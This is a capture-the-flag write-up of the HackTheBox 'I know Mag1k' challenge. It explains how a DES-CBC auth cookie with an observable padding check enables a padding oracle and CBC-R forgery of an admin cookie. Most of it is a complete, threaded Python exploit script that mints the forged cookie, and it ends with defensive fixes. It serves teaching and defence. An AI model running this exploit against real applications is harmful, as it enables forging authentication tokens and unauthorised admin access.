## Overview

**I know Mag1k** is an Easy HackTheBox **Crypto** challenge. The app authenticates with an
encrypted cookie and the brief is simply *"Can you get to the profile page of the admin?"*.
The cookie is a DES-CBC token with no integrity protection, and the server's response differs
depending on whether the decrypted padding is valid. That single leaked bit is a
[padding oracle](https://cwe.mitre.org/data/definitions/347.html), and with the **CBC-R**
technique a *decryption* oracle becomes an *encryption* oracle ŌĆö letting us forge a cookie that
decrypts to `{"role":"admin"}` without ever knowing the key.

## The technique

The auth cookie has the shape:

```
iknowmag1k = base64( IV || DES-CBC-encrypt( {"user":"<u>","role":"<r>"} ) )
```

`profile.php` renders the flag whenever `isAdmin()` is true, and `isAdmin()` does only one thing:
decrypt the cookie and check `role === "admin"`. No login, no database row. So the whole challenge
reduces to: **produce a cookie that decrypts to JSON with `role` = `admin`.**

Two design mistakes combine to make that possible:

1. **Unauthenticated CBC** ŌĆö the token is encrypted but never MAC'd, so flipping ciphertext bytes
   predictably changes the decrypted plaintext.
2. **An observable padding check** ŌĆö PHP's `openssl_decrypt(..., OPENSSL_RAW_DATA)` validates the
   PKCS#7 padding and returns `false` when it's wrong. The handler then `exit;`s, producing an
   **empty HTTP 200**; valid padding falls through to a **302 redirect**. That `200`-vs-`302`
   difference is the oracle ŌĆö it is *behavioral*, not a literal "padding invalid" string:

| cookie state               | response              |
|----------------------------|-----------------------|
| bad padding                | `200`, empty body     |
| valid padding (non-admin)  | `302` ŌåÆ `/login.php`  |
| valid padding, `role=admin`| `200` profile + flag  |

In CBC, `plaintext_i = Decrypt(C_i) XOR C_{i-1}`. The oracle recovers the intermediate value
`I = Decrypt(C_i)` for any block, byte by byte. Once you can compute `I` for an arbitrary block you
can **forge**: choose the plaintext `P` you want and set the previous block to `C_{prev} = I XOR P`,
so CBC decrypts the pair to exactly `P`. Chain it backwards; the first block you create becomes the IV.

## Solution

Drive the oracle over HTTP and run CBC-R to mint the admin cookie. DES uses **8-byte** blocks.

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, base64, urllib.parse, threading, requests
from concurrent.futures import ThreadPoolExecutor

HOST = sys.argv[1] if len(sys.argv) > 1 else "<host:port>"
URL = f"http://{HOST}/profile.php"
BS = 8           # DES block size
WORKERS = 32     # concurrent oracle queries

_tl = threading.local()
def _sess():
    s = getattr(_tl, "s", None)
    if s is None:
        s = _tl.s = requests.Session()
    return s

def oracle(raw: bytes) -> bool:
    # valid padding -> 302 (redirect login.php) ; bad padding -> 200 empty (exit)
    cookie = urllib.parse.quote(base64.b64encode(raw).decode(), safe="")
    r = _sess().get(URL, headers={"Cookie": f"iknowmag1k={cookie}"},
                    allow_redirects=False, timeout=15)
    return r.status_code == 302

def decrypt_block(c_block: bytes) -> bytes:
    # recover I = Decrypt(c_block) via the padding oracle, 256 guesses/byte in parallel
    inter = bytearray(BS)
    with ThreadPoolExecutor(max_workers=WORKERS) as pool:
        for pad in range(1, BS + 1):
            idx = BS - pad
            def mk(guess):
                f = bytearray(BS); f[idx] = guess
                for j in range(idx + 1, BS):
                    f[j] = inter[j] ^ pad
                return f
            hits = [g for g, ok in
                    zip(range(256), pool.map(lambda g: oracle(bytes(mk(g)) + c_block), range(256)))
                    if ok]
            if pad == 1:                       # reject a coincidental longer valid pad
                real = []
                for g in hits:
                    f = mk(g); f[idx - 1] ^= 0xFF
                    if oracle(bytes(f) + c_block):
                        real.append(g)
                hits = real or hits
            inter[idx] = hits[0] ^ pad
    return bytes(inter)

def pkcs7(data: bytes) -> bytes:
    p = BS - (len(data) % BS)
    return data + bytes([p]) * p

def cbc_r(plaintext: bytes) -> bytes:
    blocks = [plaintext[i:i + BS] for i in range(0, len(plaintext), BS)]
    c_next = bytes(BS)                          # arbitrary final ciphertext block
    cipher = bytearray(c_next)
    for p in reversed(blocks):
        inter = decrypt_block(c_next)
        c_prev = bytes(a ^ b for a, b in zip(inter, p))
        cipher[:0] = c_prev                     # prepend
        c_next = c_prev
    return bytes(cipher)                         # first block is the IV

raw = cbc_r(pkcs7(b'{"role":"admin"}'))
cookie = urllib.parse.quote(base64.b64encode(raw).decode(), safe="")
r = _sess().get(URL, headers={"Cookie": f"iknowmag1k={cookie}"}, allow_redirects=False)
import re
print(re.search(r"HTB\{[^}]*\}", r.text).group(0))
```

Run it against the instance:

```bash
python3 solve.py <host:port>
# HTB{...}
```

Two practical notes that decide success:

- **URL-encode the base64 cookie** (`+` ŌåÆ `%2B`, `/` ŌåÆ `%2F`, `=` ŌåÆ `%3D`). PHP URL-decodes cookies,
  so a raw `+` becomes a space and every oracle query reads as invalid padding.
- **Thread the 256 guesses per byte.** Each oracle query is one HTTP request (~0.2 s); a serial
  three-block forge takes 10+ minutes. A 32-worker pool with a thread-local `Session` brings it to ~1 minute.

The forged cookie decrypts to `{"role":"admin"}`, `isAdmin()` returns true, and `profile.php` renders the flag:

```
HTB{...}
```

## Why it worked

The ciphertext was **malleable** (no authentication) *and* the server **leaked padding validity**
(distinct response on the `exit;` path). Either flaw alone is much weaker; together they hand an
attacker full plaintext control over a trust-bearing token, so a decryption-only oracle is enough to
*encrypt* a forged admin cookie via CBC-R.

## Fix / defense

- Use **authenticated encryption** (AES-GCM, ChaCha20-Poly1305) or Encrypt-then-MAC, and verify the
  tag **before** unpadding ŌĆö tampered ciphertext then yields one generic failure and never reveals padding state.
- Don't wrap a trust token in raw CBC at all; a signed token (JWT/HMAC) needs no decryption and exposes no oracle.
- Return a single generic error for every decrypt/unpad failure and return immediately ŌĆö never branch
  the response (status, body, or timing) on padding validity.
